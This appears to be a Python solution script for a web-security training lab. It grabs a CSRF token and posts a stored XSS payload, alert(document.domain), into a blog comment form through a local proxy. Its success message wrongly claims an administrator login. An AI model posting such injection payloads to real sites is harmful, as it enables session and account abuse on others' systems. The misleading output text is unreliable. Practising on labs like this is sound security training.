import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' :'http://127.0.0.1:8080','https' :'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    print("CSRF token", csrf)
    return csrf

def exploit_xss(s, url, payload):
    csrf = get_csrf_token(s, url)
    r = s.post(url, data=payload, verify=False, proxies=proxies)
    res = r.text
    print(res)
    if "Congratulations, you solved the lab" in res:
        return True
    else:
        return  False
    # does nothing


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[ - ] Usage: %s <url>" % sys.argv[0])
        print('[ - ] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    payload = {
        'csrf': get_csrf_token(s, url),
        'postId': 5,
        'comment': '<script>alert(document.domain)</script>',
        'name': 'Name',
        'email': 'invalid@example.com',
        'website': 'http://www.example.com'
    }
    if exploit_xss(s, url, payload):
        print("[ + ] XSS successful! We have logged in as the administrator user.")
    else:
        print("[ - ] XSS failed)")